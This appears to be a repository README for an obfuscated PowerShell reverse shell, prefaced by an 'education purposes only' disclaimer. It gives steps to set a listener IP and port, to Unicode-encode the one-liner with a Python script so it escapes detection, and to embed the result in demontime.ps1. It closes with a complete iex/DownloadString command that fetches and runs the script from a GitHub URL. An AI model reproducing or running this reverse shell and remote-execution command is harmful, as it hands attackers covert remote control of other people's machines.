⚠️ Disclaimer: Employing the methods and principles outlined in this repository to obtain unauthorized entry into systems without proper authorization is against the law. You are accountable for your conduct. Act responsibly and refrain from engaging in malicious activities. This is for education purposes only


**Instructions**

1. Edit the Obfuscated PowerShell reverse shell one liner script with your chosen listener IP Address and Port number.
2. Use the Python script to convert the PowerShell reverse shell one liner characters to its Unicode format.
3. Replace the Unicode payload on the demontime.ps1 script with the output generated from the Python script.

**Optional**

Fork this repo so you can run the following one liner:
**NOTE: Replace the URL with your own forked repo.** 

```iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/xxxxxx/experiment/main/demontime.ps1');demontime```



